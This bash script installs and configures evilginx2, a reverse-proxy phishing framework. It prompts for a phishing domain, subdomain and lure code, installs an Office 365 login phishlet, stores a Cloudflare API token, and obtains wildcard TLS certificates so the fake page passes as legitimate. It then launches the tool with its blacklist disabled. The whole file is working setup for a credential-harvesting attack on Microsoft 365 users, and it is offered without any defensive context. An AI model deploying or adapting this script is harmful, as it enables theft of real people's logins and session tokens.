#!/bin/bash
go mod tidy
go mod vendor
go build -o ./bin/evilginx -buildvcs=false
killall evilginx2

#cp -a ./install/config.yaml.template ./config/config.yaml || cp -a ../install/config.yaml.template ../config/config.yaml || cp -a install/config.yaml.template config/config.yaml
DOMAIN=$(whiptail --title "Enter phishing domain" --inputbox "Domain you want to use for evilginx2" 8 40 3>&1 1>&2 2>&3)
exitstatus=$?
if [ $exitstatus = 0 ]; then
    sed -i s/Zero2964/"$DOMAIN"/g ./config/config.yaml || sed -i s/Zero2964/"$DOMAIN"/g ../config/config.yaml || sed -i s/Zero2964/"$DOMAIN"/g ./config/config.yaml
    mkdir -p ./config/crt/"$DOMAIN" &&
        (whiptail --title "Domain Saved" --msgbox "New domain has been successfully set to $DOMAIN" 8 40 3>&1 1>&2 2>&3)
else
    (whiptail --title "Domain Missing" --msgbox "Please re-run setup and enter a domain next time!" 8 40 3>&1 1>&2 2>&3)
    exit 0
fi

cp -a ./install/o365.yaml.template ./phishlets/o365.yaml || cp -a ../install/o365.yaml.template ../phishlets/o365.yaml || cp -a install/o365.yaml.template phishlets/o365.yaml
SUBDOMAIN=$(whiptail --title "Enter phishing subdomain" --inputbox "Subdomain you want your your evilginx2 lure to contain" 8 40 3>&1 1>&2 2>&3)
exitstatus=$?
if [ $exitstatus = 0 ]; then
    sed -i "0,/login/{s//""$SUBDOMAIN""/}" ./phishlets/o365.yaml || sed -i "0,/login/{s//""$SUBDOMAIN""/}" ../phishlets/o365.yaml || sed -i "0,/login/{s//""$SUBDOMAIN""/}" phishlets/o365.yaml
    (whiptail --title "Subdomain Saved" --msgbox "New visitors will arrive on ""$SUBDOMAIN"."$DOMAIN" 8 40 3>&1 1>&2 2>&3)
else
    SUBDOMAIN=""
    (whiptail --title "Subdomain Saved" --msgbox "New visitors will arrive on ""$SUBDOMAIN"."$DOMAIN" 8 40 3>&1 1>&2 2>&3)
fi

LURE=$(whiptail --title "eXpress Install" --inputbox "Select lure code at the end of a phishing link" 8 40 "" 3>&1 1>&2 2>&3)
exitstatus=$?
if [ $exitstatus = 0 ]; then
    sed -i s/BYMURbys/"$LURE"/g ./config/config.yaml || sed -i s/BYMURbys/"$LURE"/g ../config/config.yaml || sed -i s/BYMURbys/"$LURE"/g config/config.yaml
fi
whiptail --title "eXpress Install" --msgbox "eXpress install has completed. Launching evilginx2 in debug mode after this message (disables the blacklist temporarily)""\n""The page is enabled and should be accessible at $SUBDOMAIN $DOMAIN / $LURE" 12 55 3>&1 1>&2 2>&3

OUT=cf_api_token.conf

if [ -s cf_api_token.conf ]; then
    CLOUDFLARE_DNS_API_TOKEN=$(<$OUT)
    (whiptail --title "API Token" --msg "Cloudflare API Token $CLOUDFLARE_DNS_API_TOKEN is using previously saved entry, delete cf_api_token.conf to disable this" 10 40 3>&1 1>&2 2>&3)
else
    CLOUDFLARE_DNS_API_TOKEN=$(whiptail --title "Enter Cloudflare API Token" --inputbox "Cloudflare API Token" 10 40 "$CLOUDFLARE_DNS_API_TOKEN" 3>&1 1>&2 2>&3)
    exitstatus=$?
    if [ $exitstatus = 0 ]; then
        echo -e "$CLOUDFLARE_DNS_API_TOKEN" | sudo tee $OUT
    else
        exit 1
    fi
fi

(whiptail --title "Wildcard Certificates" --yesno "Request new wildcard certificates for $DOMAIN and *.$DOMAIN?" 10 40 3>&1 1>&2 2>&3)
exitstatus=$?
if [ $exitstatus -eq 0 ]; then
    if [[ ! -f ./lego || ! -f ../lego || ! -f lego ]]; then
        wget https://github.com/go-acme/lego/releases/download/v4.8.0/lego_v4.8.0_linux_amd64.tar.gz -O ./lego.tar.gz && tar xf ./lego.tar.gz
    fi
    set -ex
    (CLOUDFLARE_DNS_API_TOKEN=$CLOUDFLARE_DNS_API_TOKEN ./lego --accept-tos --filename o365 --path ./ --dns cloudflare --email hostmaster@"$DOMAIN" --domains "$DOMAIN" --domains *."$DOMAIN" run) &&
        rm -rf ./certificates/o365.issuer.crt ./certificates/o365.json &&
        mkdir -p ./config/crt &&
        cp -a ./certificates/o365.key ./config/crt/"$DOMAIN"/o365.key &&
        cp -a ./certificates/o365.crt ./config/crt/"$DOMAIN"/o365.crt
else
    exit 1
fi
cd /root/evilginx2 && make debug
